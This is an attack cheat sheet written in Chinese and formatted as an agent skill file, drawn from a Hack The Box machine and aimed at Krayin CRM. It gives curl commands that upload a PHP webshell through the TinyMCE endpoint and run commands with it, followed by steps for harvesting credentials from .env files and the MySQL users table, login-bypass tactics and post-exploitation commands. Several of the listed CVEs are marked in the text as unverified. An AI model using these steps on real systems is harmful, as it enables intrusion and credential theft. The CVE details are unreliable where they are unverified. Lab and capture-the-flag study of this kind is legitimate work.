---
name: 'krayin-crm-attacks'
description: 'Krayin CRM 攻击速查：CVE-2026-38526 TinyMCE 上传 RCE、凭据来源、其他 CVE、登录绕过思路。来源 Nexus HTB。'
disable-model-invocation: true
metadata: { domain: web, tier: T3 }
---


# Krayin CRM (Webkul) 攻击速查

> Laravel 12.x 生态的 CRM 系统。HTB Nexus 靶机关键入口。

## 识别

```bash
# HTTP 特征
Set-Cookie: krayin_crm_session=
# 页面标题
<title>Krayin CRM</title>
# 默认路径
/admin/login
/admin/dashboard
# 版本
# Admin panel footer: "Powered by Krayin"
# /composer.json → "krayin/laravel-crm": "2.2.x"
```text

## CVE-2026-38526 — TinyMCE 文件上传 RCE (CVSS 9.9)

**影响版本**: Krayin CRM v2.2.x
**认证要求**: 需要（任意用户）
**端点**: `/admin/tinymce/upload`
**原因**: 无服务端文件类型/扩展名验证

```bash
# 利用 — 上传 PHP webshell
curl -s -b <auth_cookie> \
  -F "file=@shell.php;type=image/png" \
  "http://<target>/admin/tinymce/upload?_token=<csrf>"
# 响应: {"location":"http://<target>/storage/tinymce/<hash>.php"}

# RCE
curl "http://<target>/storage/tinymce/<hash>.php?c=id"
```text

## 其他已知 CVE

| CVE | 类型 | 认证 | 说明 |
|-----|------|------|------|
| CVE-2026-38526 | 任意文件上传 → RCE | 需要 | TinyMCE upload（Nexus 靶机特定编号，未独立核实） |
| CVE-2026-36340 | 邮件附件上传 → RCE | 需要 | compose email 功能 (v2.1.5)（已公开核实） |
| CVE-2026-38532 | BOLA 密码重置 | 需要 | UserController 越权重置密码（未独立核实） |
| CVE-2026-38530 | BOLA Lead 读取 | 需要 | 越权读其他用户的 leads（未独立核实） |
| CVE-2026-38528 | SQL 注入 | 需要 | rotten_lead 参数（未独立核实） |
| CVE-2026-5370 | XSS + 代码注入 | — | Activities/Notes 模块（已公开核实） |

## 凭据来源

```bash
# 1. .env 文件（如果可读）
cat /var/www/krayin/.env
# DB_USERNAME=krayin, DB_PASSWORD=...

# 2. Git 仓库泄露
# Gitea: admin/krayin-docker-setup → git history → DB_PASSWORD

# 3. MySQL 数据库（如果有 shell）
mysql -u krayin -p<password> -e "SELECT email, password FROM krayin.users;"
# 密码是 bcrypt: $2y$10$...

# 4. 密码复用
# Krayin 登录密码可能 = DB 密码 → 直接试
```text

## 登录绕过思路

1. **默认凭据**: admin@domain / 安装时设置的密码
2. **DB 密码复用**: .env 中 DB_PASSWORD 可能就是 admin 密码
3. **Git 历史**: commit diff 中删除的密码 → 尝试登录
4. **忘记密码**: `/admin/forget-password` → 邮箱可能有效 → 若能收邮件可重置
5. **BOLA 修改用户**: CVE-2026-38532 → 如已认证，直接重置 admin 密码

## 后渗透

```bash
# webshell 上传后 → 读 .env
cat /var/www/krayin/.env

# 数据库凭据 → 可能 = SSH 用户密码
mysql -u krayin -p<DB_PASSWORD> -h 127.0.0.1

# 检查 Laravel debug mode（debugbar 暴露敏感信息）
# 每个请求的响应底部都有 debugbar JSON

# 提权线索
systemctl list-timers --all | grep -i gitea
cat /etc/gitea/template-sync.py  # Nexus 特定
```text
